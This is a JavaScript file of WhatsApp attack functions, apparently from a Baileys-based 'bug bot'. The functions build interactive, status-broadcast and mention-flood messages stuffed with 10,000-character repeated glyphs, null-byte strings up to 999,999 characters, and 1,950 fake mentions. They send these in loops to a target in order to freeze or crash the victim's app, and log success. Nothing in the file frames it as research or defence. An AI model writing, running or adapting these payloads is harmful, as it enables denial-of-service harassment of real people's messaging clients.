async function FrezeXblank(sock, jid) {
try {
  const videoPayload = await prepareWAMessageMedia({
    video: { url: "https://files.catbox.moe/74v4yo.mp4", gifPlayback: true }
  }, {
    upload: sock.waUploadToServer,
    mediaType: "video"
  })
  for (let i = 0; i < 100; i++) {
    const msg = generateWAMessageFromContent(jid, proto.Message.fromObject({
      interactiveMessage: {
        contextInfo: {
          mentionedJid: [jid],
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363399013145023@newsletter",
            newsletterName: "✦",
            serverMessageId: 1
          }
        },
        header: {
          title: "",
          ...videoPayload,
          hasMediaAttachment: true
        },
        body: { text: "𐍃𐌍𐌉𐌕𐌂𐌇 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂" },
        footer: { text: "" },
        nativeFlowMessage: {
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{"title":"${"ꦾ".repeat(10000)}","sections":[{"title":"Crash","rows":[]}]}`
            },
            {
              name: "address_message",
              buttonParamsJson: JSON.stringify({
                "screen_1_TextInput_0": "radio - buttons" + "\u0000".repeat(10000),
                "screen_0_Dropdown_1":  "\u0000".repeat(10000),
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
              }),
              version: 3
            }
          ]
        }
      }
    }), { userJid: jid })
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id })
  }
} catch (err) {
      console.error(err);
 }
console.log(chalk.red(`Success Sent Friz to ${jid}`))
}


async function DelayGroup(sock, jid) {
    const mentionedList = Array.from({ length: 1950 }, () => `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`);

  await sock.sendMessage(jid, {
    text: ".",
    mentions: jid,
    contextInfo: {
      mentionedJid: mentionedList,
      isGroupMention: true
    }
  });
}


async function SnitchDelayVolteX(sock, jid) {
try {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 1950 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];
    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "𐍃𐌍𐌉𐌕𐌂𐌇 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂" + "ោ៝".repeat(10000),
        title: "𐍃𐌍𐌉𐌕𐌂𐌇 ",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/17606956_686071860479481_2023913755657097039_n.enc?ccb=11-4&oh=01_Q5Aa1QG9-CRTR3xBq-Vz4QoJnMZRKop5NHKdAB9xc-rN1ds8cg&oe=683FA8F9&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "Y7jQDWDPfQSIEJ34j3BFn6Ad4NLuBer0W3UTHwqvpc8=",
        fileLength: "5945180",
        seconds: 17,
        mediaKey: "4s+R9ADOCB3EUsrVDE6XbKWrUNv31GRuR/bo2z8U3DU=",
        height: 1280,
        width: 720,
        fileEncSha256: "hG/yZfURm4ryYYa0JUnHdNautOMsYGoFKDGd5/4OGLQ=",
        directPath: "/v/t62.7161-24/17606956_686071860479481_2023913755657097039_n.enc?ccb=11-4&oh=01_Q5Aa1QG9-CRTR3xBq-Vz4QoJnMZRKop5NHKdAB9xc-rN1ds8cg&oe=683FA8F9&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1746415507",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "✦"
        },
        annotations: [{
            embeddedContent: { embeddedMusic },
            embeddedAction: true
        }]
    };

    const stickerMessage = {
        stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileLength: { low: 1, high: 0, unsigned: true },
            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            contextInfo: {
                mentionedJid: mentionedList
            }
        }
    };

    const radMsg1 = generateWAMessageFromContent(jid, {
        viewOnceMessage: { message: { videoMessage } }
    }, {});
    const radMsg2 = generateWAMessageFromContent(jid, {
        viewOnceMessage: { message: stickerMessage }
    }, {});

    await sock.relayMessage("status@broadcast", radMsg1.message, {
        messageId: radMsg1.key.id,
        statusJidList: [jid],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: jid }, content: undefined }]
            }]
        }]
    });

    await sock.relayMessage("status@broadcast", radMsg2.message, {
        messageId: radMsg2.key.id,
        statusJidList: [jid],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: jid }, content: undefined }]
            }]
        }]
    });
    const comboMsg = await generateWAMessageFromContent(jid, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    messageSecret: crypto.randomBytes(32)
                },
                interactiveResponseMessage: {
                    body: {
                        text: "0@s.whatsapp.net ",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "0@s.whatsapp.net",
                        paramsJson: "\u0000".repeat(999999),
                        version: 3
                    },
                    contextInfo: {
                        isForwarded: true,
                        forwardingScore: 9999,
                        forwardedNewsletterMessageInfo: {
                            newsletterName: "TRIGGER SYSTEM",
                            newsletterJid: "120363321780343299@newsletter",
                            serverMessageId: 1
                        }
                    }
                }
            }
        }
    }, {});

    await sock.relayMessage("status@broadcast", comboMsg.message, {
        messageId: comboMsg.key.id,
        statusJidList: [jid],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: jid }, content: undefined }]
            }]
        }]
    });

    await sock.sendMessage(jid, {
        text: "𐍃𐌍𐌉𐌕𐌂𐌇 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂",
        mentions: mentionedList
    });
 } catch (err) {
      console.error(err);
 }
console.log(chalk.red(`Success Sent SnitchDelayVolteX to ${jid}`))
}
